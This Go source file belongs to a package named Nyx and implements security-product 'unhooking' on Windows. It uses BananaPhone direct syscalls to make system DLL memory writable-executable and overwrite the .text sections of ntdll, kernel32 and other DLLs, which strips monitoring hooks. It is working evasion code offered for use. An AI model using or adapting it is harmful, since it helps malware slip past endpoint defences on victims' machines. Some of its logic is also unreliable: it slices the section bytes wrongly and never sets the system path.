package Nyx

import (
	"debug/pe"
	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
	"github.com/EvilBytecode/GolangStyle/pkg"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"syscall"
	"unsafe"
	"time"
	"runtime"
)

var (
	gostyleInitialized bool
	syspath            string
)


func banana() (uint16, uint16) {
	bp, e := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	if e != nil {
		panic(e)
	}

	write, e := bp.GetSysID("ZwWriteVirtualMemory")
	if e != nil {
		panic(e)
	}

	protect, e := bp.GetSysID("NtProtectVirtualMemory")
	if e != nil {
		panic(e)
	}

	return write, protect
}

func RefreshPE(name string) error {
	if !gostyleInitialized {
		if err := gostyle.Init(); err != nil {
			return err
		}
		gostyleInitialized = true
	}

	df, e := ioutil.ReadFile(name)
	if e != nil {
		return e
	}

	f, e := pe.Open(name)
	if e != nil {
		return e
	}

	x := f.Section(".text")
	ddf := df[x.Offset:x.Size]
	return writeGoodBytes(ddf, name, x.VirtualAddress)
}

func writeGoodBytes(b []byte, pn string, virtualoffset uint32) error {
	write, protect := banana()

	t, e := syscall.LoadDLL(pn)
	if e != nil {
		return e
	}
	defer t.Release()

	h := t.Handle
	dllBase := uintptr(h)
	dllOffset := uint(dllBase) + uint(virtualoffset)

	var old uint32
	sizet := len(b)
	var thisThread = uintptr(0xffffffffffffffff)

	_, r := bananaphone.Syscall(
		protect,
		uintptr(thisThread),
		uintptr(unsafe.Pointer(&dllOffset)),
		uintptr(unsafe.Pointer(&sizet)),
		windows.PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&old)),
	)
	if r != nil {
		gostyle.Write("Failed to modify memory permissions:", gostyle.RED_TO_YELLOW, false)
		return r
	}

	now := time.Now().Format("15:04:05")
	gostyle.Write("["+now+"] [Memory map set to RWX] ["+pn+"] [DLL overwritten successfully]", gostyle.GREEN_TO_CYAN, false)

	// Write the new bytes
	_, r = bananaphone.Syscall(
		write,
		uintptr(thisThread),
		uintptr(dllOffset),
		uintptr(unsafe.Pointer(&b[0])),
		uintptr(len(b)),
		0,
	)
	if r != nil {
		gostyle.Write("NtWriteVirtualMemory Error", gostyle.RED_TO_YELLOW, false)
		return r
	}

	return nil
}

func Unhook386() {
	RefreshPE(syspath + "kernel32.dll")
	RefreshPE(syspath + "kernelbase.dll")
	RefreshPE(syspath + "ntdll.dll")
	RefreshPE(syspath + "user32.dll")
	RefreshPE(syspath + "apphelp.dll")
	RefreshPE(syspath + "msvcrt.dll")
}

func Unhook64() {
	RefreshPE(syspath + "kernel32.dll")
	RefreshPE(syspath + "kernelbase.dll")
	RefreshPE(syspath + "ntdll.dll")
	RefreshPE(syspath + "user32.dll")
	RefreshPE(syspath + "apphelp.dll")
	RefreshPE(syspath + "msvcrt.dll")
}

func AutoUnhook() {
	switch runtime.GOARCH {
	case "amd64":
		Unhook64()
	case "386":
		Unhook386()
	default:
		panic("Unsupported architecture")
	}
}
